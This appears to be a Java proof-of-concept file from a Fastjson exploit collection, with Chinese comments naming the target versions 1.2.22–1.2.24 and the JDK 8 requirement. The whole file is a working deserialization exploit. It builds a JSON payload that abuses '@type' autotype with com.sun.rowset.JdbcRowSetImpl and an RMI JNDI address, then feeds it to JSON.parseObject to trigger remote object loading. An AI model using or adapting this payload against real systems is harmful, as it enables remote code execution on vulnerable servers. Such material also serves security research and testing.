package com.yyjccc.fastjson.exp.low;


import com.alibaba.fastjson.JSON;

/**
 * 版本： Fastjson 1.2.x系列的1.2.22-1.2.24版本 <br/>
 * 条件： 需要满足JNDI注入的条件 <br/>
 * jdk:  需要jdk8  <br/>
 * 描述： 利用fastjson打JdbcRowSetImpl打jndi
 */
public class JdbcRowSetImplPoc {
	public static void main(String[] args) {
		String jndiAddress="rmi://127.0.0.1:8085/YjQUxZVf";
		String data="{\n\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\"DataSourceName\":\""+jndiAddress+"\",\n\"AutoCommit\":false\n}";
		System.out.println(data);
		JSON.parseObject(data);
		//JSON.parse(data);
	}
}
